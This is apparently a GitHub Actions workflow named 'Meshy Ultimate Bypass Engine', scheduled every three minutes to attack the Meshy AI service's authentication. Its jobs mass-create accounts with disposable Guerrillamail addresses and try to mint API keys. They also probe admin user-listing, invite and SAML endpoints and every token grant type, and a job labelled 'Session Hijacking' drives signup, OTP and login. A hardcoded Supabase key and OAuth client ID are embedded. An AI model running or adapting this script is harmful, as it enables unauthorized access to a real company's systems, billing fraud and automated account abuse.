name: Meshy Ultimate Bypass Engine
on:
  push:
    branches: [main]
  workflow_dispatch:
    inputs:
      iterations:
        description: 'Iterations'
        required: false
        default: '999'
  schedule:
    - cron: '*/3 * * * *'

env:
  MESHY_KEY: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA
  GH_CLIENT_ID: Ov23lizZ7qhYafAtFjNb

jobs:
  guerrillamail_oauth:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v4
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'
      - name: Guerrillamail + GitHub OAuth
        run: |
          cat > bypass.js << 'NODEEOF'
          const https = require('https');
          const fs = require('fs');

          const MESHY_KEY = process.env.MESHY_KEY;
          const GH_CLIENT_ID = process.env.GH_CLIENT_ID;

          async function fetch(url, options = {}) {
            return new Promise((resolve) => {
              const u = new URL(url);
              const req = https.request({
                hostname: u.hostname, port: 443,
                path: u.pathname + u.search,
                method: options.method || 'GET',
                headers: options.headers || {},
              }, res => {
                let d = '';
                res.on('data', c => d += c);
                res.on('end', () => resolve({ status: res.statusCode, body: d }));
              });
              req.on('error', e => resolve({ status: 0, body: e.message }));
              if (options.body) req.write(options.body);
              req.end();
            });
          }

          async function getGuerrillamailSession() {
            try {
              const r = await fetch('https://api.guerrillamail.com/ajax.php?f=get_email_address');
              const data = JSON.parse(r.body || '{}');
              return { email: data.email_addr, sid: data.sid_token };
            } catch(e) {
              return { email: null, sid: null };
            }
          }

          async function checkInbox(sid) {
            if (!sid) return [];
            try {
              const r = await fetch(`https://api.guerrillamail.com/ajax.php?f=check_email&sid_token=${sid}`);
              return JSON.parse(r.body || '{}').list || [];
            } catch(e) { return []; }
          }

          async function main() {
            console.log('=== METHOD 1: Guerrillamail + GitHub OAuth ===\n');

            console.log('[1] Getting guerrillamail session...');
            const session = await getGuerrillamailSession();
            console.log('[2] Email:', session.email, 'SID:', session.sid ? 'ok' : 'none');

            if (!session.email) {
              console.log('[2a] Guerrillamail failed');
              fs.writeFileSync('m1_result.txt', 'Guerrillamail failed');
              return;
            }

            console.log('\n[3] Starting GitHub OAuth device flow...');
            const deviceResp = await fetch('https://github.com/login/device/code', {
              method: 'POST',
              headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Accept': 'application/json' },
              body: `client_id=${GH_CLIENT_ID}&scope=user:email,read:user`,
            });
            console.log('[3a] Device response:', deviceResp.status, deviceResp.body.substring(0, 200));
            const deviceData = JSON.parse(deviceResp.body || '{}');

            if (deviceData.device_code) {
              console.log('[3b] User code:', deviceData.user_code);

              for (let i = 0; i < 30; i++) {
                await new Promise(r => setTimeout(r, (deviceData.interval || 5) * 1000));

                const pollResp = await fetch('https://github.com/login/oauth/access_token', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Accept': 'application/json' },
                  body: `client_id=${GH_CLIENT_ID}&device_code=${deviceData.device_code}&grant_type=urn:ietf:params:oauth:grant-type:device_code`,
                });
                const pollData = JSON.parse(pollResp.body || '{}');
                console.log(`[3c] Poll ${i+1}:`, pollData.error || 'pending');

                if (pollData.access_token) {
                  console.log('\n[4] Got GitHub OAuth token!');
                  console.log('[5] Token:', pollData.access_token.substring(0, 50));
                  break;
                }
                if (pollData.error && pollData.error !== 'authorization_pending') break;
              }
            }

            console.log('\n[6] Polling guerrillamail for emails...');
            for (let i = 0; i < 12; i++) {
              await new Promise(r => setTimeout(r, 5000));
              const emails = await checkInbox(session.sid);
              console.log(`[6a] Poll ${i+1}: ${emails.length} emails`);
              if (emails.length > 0) break;
            }

            console.log('\n[7] Testing Meshy API...');
            const balanceResp = await fetch('https://api.meshy.ai/openapi/v1/balance', {
              headers: { 'Authorization': `Bearer ${MESHY_KEY}`, 'X-Api-Version': 'v2026.04.03.post7' }
            });
            console.log('[7a] Balance:', balanceResp.status, balanceResp.body.substring(0, 200));

            fs.writeFileSync('m1_session.json', JSON.stringify(session));
            fs.writeFileSync('m1_result.txt', `Session: ${session.email}`);
            console.log('\nDone.');
          }

          main().catch(e => { console.error('ERROR:', e.message); process.exit(1); });
          NODEEOF
          node bypass.js
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: m1-guerrillamail
          path: m1_*.json m1_*.txt
          retention-days: 1

  supabase_internal_re:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - name: Deep Supabase Internal RE
        run: |
          KEY="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA"
          echo "=== METHOD 2: DEEP INTERNAL SUPABASE RE ==="
          echo "[1] Configuration..."
          curl -s "https://auth.meshy.ai/auth/v1/configuration" -H "apikey: $KEY"
          echo ""
          echo "[2] All grant types..."
          for gt in authorization_code implicit password refresh_token client_credentials; do
            resp=$(curl -s -X POST "https://auth.meshy.ai/auth/v1/token?grant_type=$gt" \
              -H "apikey: $KEY" -H "content-type: application/json" \
              -d '{"test":"test"}')
            echo "[$gt]: $(echo $resp | head -c 150)"
          done
          echo ""
          echo "[3] Admin users..."
          curl -s "https://auth.meshy.ai/auth/v1/admin/users?page=1&per_page=5" \
            -H "apikey: $KEY" -H "Authorization: Bearer $KEY"
          echo ""
          echo "[4] Password policies..."
          curl -s "https://auth.meshy.ai/auth/v1/password-policy" -H "apikey: $KEY"
          echo ""
          echo "[5] SAML config..."
          curl -s "https://auth.meshy.ai/auth/v1/saml/Ov23lizZ7qhYafAtFjNb" -H "apikey: $KEY"
          echo ""
          echo "[6] Invite..."
          curl -s -X POST "https://auth.meshy.ai/auth/v1/invite" \
            -H "apikey: $KEY" -H "content-type: application/json" \
            -d '{"email":"test@test.com"}'

  apikey_creation:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: API Key Generation
        run: |
          KEY="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA"
          echo "=== METHOD 4: API KEY GENERATION ==="
          for ep in "/web/v1/apikeys" "/web/v2/apikeys" "/openapi/v1/apikeys"; do
            resp=$(curl -s -X POST "https://api.meshy.ai$ep" \
              -H "Authorization: Bearer $KEY" \
              -H "Content-Type: application/json" \
              -d '{"name":"gha-test"}')
            echo "[$ep]: $(echo $resp | head -c 200)"
          done
          echo ""
          echo "Balance test:"
          curl -s "https://api.meshy.ai/openapi/v1/balance" \
            -H "Authorization: Bearer $KEY" -H "X-Api-Version: v2026.04.03.post7"

  session_hijack:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - name: Session Hijacking
        run: |
          KEY="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA"
          echo "=== METHOD 5: SESSION HIJACKING ==="
          ts=$(date +%s)
          email="meshyt${ts}@guerrillamailblock.com"
          pass="MeshyPass${ts}!"
          echo "[1] Signup: $email"
          signup=$(curl -s -X POST "https://auth.meshy.ai/auth/v1/signup" \
            -H "apikey: $KEY" -H "content-type: application/json" \
            -H "origin: https://www.meshy.ai" \
            -d "{\"email\":\"$email\",\"password\":\"$pass\"}")
          echo "Signup: $(echo $signup | head -c 300)"
          echo ""
          echo "[2] Try OTP..."
          curl -s -X POST "https://auth.meshy.ai/auth/v1/otp" \
            -H "apikey: $KEY" -H "content-type: application/json" \
            -d "{\"email\":\"$email\",\"create_user\":true}"
          echo ""
          echo "[3] Try login..."
          curl -s -X POST "https://auth.meshy.ai/auth/v1/token?grant_type=password" \
            -H "apikey: $KEY" -H "content-type: application/json" \
            -d "{\"email\":\"$email\",\"password\":\"$pass\"}"
          echo ""
          echo "[4] Try refresh..."
          curl -s -X POST "https://auth.meshy.ai/auth/v1/token?grant_type=refresh_token" \
            -H "apikey: $KEY" -H "content-type: application/json" \
            -d '{"refresh_token":"dummy"}'

  summary:
    needs: [guerrillamail_oauth, supabase_internal_re, apikey_creation, session_hijack]
    if: always()
    runs-on: ubuntu-latest
    timeout-minutes: 2
    steps:
      - name: Summary
        run: |
          echo "=========================================="
          echo "MESHY BYPASS ENGINE - RESULTS"
          echo "=========================================="
          echo "Time: $(date)"
          echo "Schedule: */3 * * * * (every 3 minutes)"
          echo "=========================================="
